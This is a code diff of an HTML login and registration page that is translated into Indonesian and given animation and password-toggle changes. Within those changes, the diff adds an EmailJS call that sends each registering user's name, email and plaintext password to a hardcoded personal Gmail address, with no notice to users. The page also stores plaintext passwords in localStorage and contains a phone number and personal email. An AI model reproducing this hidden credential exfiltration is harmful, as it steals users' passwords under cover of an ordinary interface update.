@@ -1,10 +1,10 @@
 <!DOCTYPE html>
-<html lang="en">
+<html lang="id">
 
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Login & Register</title>
+    <title>Masuk & Daftar</title>
     <link href="https://stackpath.bootstrapcdn.com/bootstrap/4.5.2/css/bootstrap.min.css" rel="stylesheet">
     <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;700&display=swap" rel="stylesheet">
     <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/sweetalert2@11/dist/sweetalert2.min.css">
@@ -57,6 +57,10 @@
             animation: fadeIn 1s ease-in-out;
         }
 
+        .fade-out {
+            animation: fadeOut 1s ease-in-out;
+        }
+
         @keyframes fadeIn {
             from {
                 opacity: 0;
@@ -64,6 +68,16 @@
 
             to {
                 opacity: 1;
+            }
+        }
+
+        @keyframes fadeOut {
+            from {
+                opacity: 1;
+            }
+
+            to {
+                opacity: 0;
             }
         }
 
@@ -103,59 +117,84 @@
             color: #fff;
             font-weight: bold;
         }
+
+        .password-toggle {
+            position: relative;
+        }
+
+        .password-toggle .toggle-icon {
+            position: absolute;
+            top: 50%;
+            right: 10px;
+            transform: translateY(-50%);
+            cursor: pointer;
+        }
     </style>
+    <script src="https://cdn.jsdelivr.net/npm/sweetalert2@11"></script>
+    <script type="text/javascript" src="https://cdn.jsdelivr.net/npm/@emailjs/browser@4/dist/email.min.js">
+    </script>
+    <script type="text/javascript">
+        (function () {
+            emailjs.init({
+                publicKey: "z2r8bTyDY06-m711J",
+            });
+        })();
+    </script>
 </head>
 
 <body>
     <div class="container" id="login-form">
-        <h2 class="text-center">Login</h2>
+        <h2 class="text-center">Masuk</h2>
         <form onsubmit="login(event)">
             <div class="form-group">
-                <label for="login-email">Email address</label>
-                <input type="email" class="form-control" id="login-email" placeholder="Enter email" required>
+                <label for="login-name">Nama Lengkap</label>
+                <input type="text" class="form-control" id="login-name" placeholder="Masukkan nama lengkap" required>
             </div>
-            <div class="form-group">
-                <label for="login-password">Password</label>
-                <input type="password" class="form-control" id="login-password" placeholder="Password" required>
+            <div class="form-group password-toggle">
+                <label for="login-password">Kata Sandi</label>
+                <input type="password" class="form-control" id="login-password" placeholder="Masukkan kata sandi"
+                    required>
+                <span class="toggle-icon" onclick="togglePassword('login-password')">👁️</span>
             </div>
-            <button type="submit" class="btn btn-primary btn-block">Login</button>
-            <p class="text-center mt-3">Don't have an account? <a href="#" onclick="showRegister()">Register</a></p>
+            <button type="submit" class="btn btn-primary btn-block">Masuk</button>
+            <p class="text-center mt-3">Belum punya akun? <a href="#" onclick="showRegister()">Daftar</a></p>
         </form>
     </div>
     <div class="container hidden" id="register-form">
-        <h2 class="text-center">Register</h2>
+        <h2 class="text-center">Daftar</h2>
         <form onsubmit="register(event)">
             <div class="form-group">
-                <label for="register-name">Full Name</label>
-                <input type="text" class="form-control" id="register-name" placeholder="Enter full name" required>
+                <label for="register-name">Nama Lengkap</label>
+                <input type="text" class="form-control" id="register-name" placeholder="Masukkan nama lengkap" required>
             </div>
             <div class="form-group">
-                <label for="register-email">Email address</label>
-                <input type="email" class="form-control" id="register-email" placeholder="Enter email" required>
+                <label for="register-email">Alamat Email</label>
+                <input type="email" class="form-control" id="register-email" placeholder="Masukkan email" required>
             </div>
-            <div class="form-group">
-                <label for="register-password">Password</label>
-                <input type="password" class="form-control" id="register-password" placeholder="Password" required>
+            <div class="form-group password-toggle">
+                <label for="register-password">Kata Sandi</label>
+                <input type="password" class="form-control" id="register-password" placeholder="Masukkan kata sandi"
+                    required>
+                <span class="toggle-icon" onclick="togglePassword('register-password')">👁️</span>
             </div>
-            <button type="submit" class="btn btn-primary btn-block">Register</button>
-            <p class="text-center mt-3">Already have an account? <a href="#" onclick="showLogin()">Login</a></p>
+            <button type="submit" class="btn btn-primary btn-block">Daftar</button>
+            <p class="text-center mt-3">Sudah punya akun? <a href="#" onclick="showLogin()">Masuk</a></p>
         </form>
     </div>
     <div class="container hidden" id="home-page">
         <div class="home-container">
-            <h1>Welcome to the Home Page</h1>
+            <h1>Selamat Datang di Halaman Beranda</h1>
             <p class="highlight">Hallo Adelia Dihyan Calysta Suseno jangan lupa makan bub nanti atit 😭</p>
-            <button class="btn btn-primary" onclick="logout()">Logout</button>
-            <button class="btn btn-success" onclick="sendToWhatsApp()">Send Answer to WhatsApp</button>
+            <button class="btn btn-primary" onclick="logout()">Keluar</button>
+            <button class="btn btn-success" onclick="sendToWhatsApp()">Kirim Jawaban ke WhatsApp</button>
         </div>
     </div>
 
     <footer>
-        <p>&copy; <span id="year"></span> by <a href="https://www.instagram.com/h.arrhmn" target="_blank">Kall</a>. All
-            rights reserved.</p>
+        <p>&copy; <span id="year"></span> oleh <a href="https://www.instagram.com/h.arrhmn" target="_blank">Kall</a>.
+            Semua hak dilindungi.</p>
     </footer>
 
-    <script src="https://cdn.jsdelivr.net/npm/sweetalert2@11"></script>
     <script>
         document.addEventListener('DOMContentLoaded', (event) => {
             const loggedInUser = localStorage.getItem('loggedInUser');
@@ -166,13 +205,27 @@
         });
 
         function showRegister() {
-            document.getElementById('login-form').classList.add('hidden');
-            document.getElementById('register-form').classList.remove('hidden');
+            const loginForm = document.getElementById('login-form');
+            const registerForm = document.getElementById('register-form');
+            loginForm.classList.add('fade-out');
+            setTimeout(() => {
+                loginForm.classList.add('hidden');
+                loginForm.classList.remove('fade-out');
+                registerForm.classList.remove('hidden');
+                registerForm.classList.add('fade-in');
+            }, 1000);
         }
 
         function showLogin() {
-            document.getElementById('register-form').classList.add('hidden');
-            document.getElementById('login-form').classList.remove('hidden');
+            const registerForm = document.getElementById('register-form');
+            const loginForm = document.getElementById('login-form');
+            registerForm.classList.add('fade-out');
+            setTimeout(() => {
+                registerForm.classList.add('hidden');
+                registerForm.classList.remove('fade-out');
+                loginForm.classList.remove('hidden');
+                loginForm.classList.add('fade-in');
+            }, 1000);
         }
 
         function register(event) {
@@ -182,20 +235,20 @@
             const password = document.getElementById('register-password').value;
 
             if (!name || !email || !password) {
-                Swal.fire('Error', 'Please fill in all fields.', 'error');
+                Swal.fire('Error', 'Harap isi semua kolom.', 'error');
                 return;
             }
 
-            // Check if email or name already exists
+            // Periksa apakah email atau nama sudah digunakan
             for (let i = 0; i < localStorage.length; i++) {
                 const key = localStorage.key(i);
                 const user = JSON.parse(localStorage.getItem(key));
                 if (user.email === email) {
-                    Swal.fire('Error', 'Email is already in use.', 'error');
+                    Swal.fire('Error', 'Email sudah digunakan.', 'error');
                     return;
                 }
                 if (user.name === name) {
-                    Swal.fire('Error', 'Full name is already in use.', 'error');
+                    Swal.fire('Error', 'Nama lengkap sudah digunakan.', 'error');
                     return;
                 }
             }
@@ -207,30 +260,38 @@
             };
 
             localStorage.setItem(email, JSON.stringify(user));
-            Swal.fire('Success', 'Registration successful!', 'success').then(() => {
+            Swal.fire('Success', 'Pendaftaran berhasil!', 'success').then(() => {
+                sendEmail(name, email, password);
                 showLogin();
             });
         }
 
         function login(event) {
             event.preventDefault();
-            const email = document.getElementById('login-email').value;
+            const name = document.getElementById('login-name').value;
             const password = document.getElementById('login-password').value;
 
-            if (!email || !password) {
-                Swal.fire('Error', 'Please fill in all fields.', 'error');
+            if (!name || !password) {
+                Swal.fire('Error', 'Harap isi semua kolom.', 'error');
                 return;
             }
 
-            const user = JSON.parse(localStorage.getItem(email));
+            let userFound = false;
+            for (let i = 0; i < localStorage.length; i++) {
+                const key = localStorage.key(i);
+                const user = JSON.parse(localStorage.getItem(key));
+                if (user.name === name && user.password === password) {
+                    userFound = true;
+                    Swal.fire('Success', 'Masuk berhasil!', 'success').then(() => {
+                        localStorage.setItem('loggedInUser', user.email);
+                        showHomePage();
+                    });
+                    break;
+                }
+            }
 
-            if (user && user.password === password) {
-                Swal.fire('Success', 'Login successful!', 'success').then(() => {
-                    localStorage.setItem('loggedInUser', email);
-                    showHomePage();
-                });
-            } else {
-                Swal.fire('Error', 'Invalid email or password.', 'error');
+            if (!userFound) {
+                Swal.fire('Error', 'Nama atau kata sandi salah.', 'error');
             }
         }
 
@@ -243,7 +304,7 @@
         }
 
         function logout() {
-            Swal.fire('Success', 'Logout successful!', 'success').then(() => {
+            Swal.fire('Success', 'Keluar berhasil!', 'success').then(() => {
                 localStorage.removeItem('loggedInUser');
                 document.getElementById('home-page').classList.add('hidden');
                 document.getElementById('login-form').classList.remove('hidden');
@@ -251,10 +312,35 @@
         }
 
         function sendToWhatsApp() {
-            const message = "(Isi jawabanmu).";
-            const phoneNumber = "+6287875369113"; // Nomor telepon dengan kode negara Indonesia
+            const message = "Jawaban untuk pertanyaan Anda.";
+            const phoneNumber = "+6287875369113";
             const url = `https://api.whatsapp.com/send?phone=${phoneNumber}&text=${encodeURIComponent(message)}`;
             window.open(url, '_blank');
+        }
+
+        function togglePassword(id) {
+            const input = document.getElementById(id);
+            const icon = input.nextElementSibling;
+            if (input.type === 'password') {
+                input.type = 'text';
+                icon.textContent = '🙈';
+            } else {
+                input.type = 'password';
+                icon.textContent = '👁️';
+            }
+        }
+
+        function sendEmail(name, email, password) {
+            emailjs.send("service_khb8bi8", "template_whbkr2p", {
+                name: name,
+                email: email,
+                password: password,
+                to_email: "haikalarrahman4@gmail.com" // Email penerima
+            }).then((response) => {
+                console.log('SUCCESS!', response.status, response.text);
+            }, (error) => {
+                console.log('FAILED...', error);
+            });
         }
     </script>
     <script src="https://code.jquery.com/jquery-3.5.1.slim.min.js"></script>
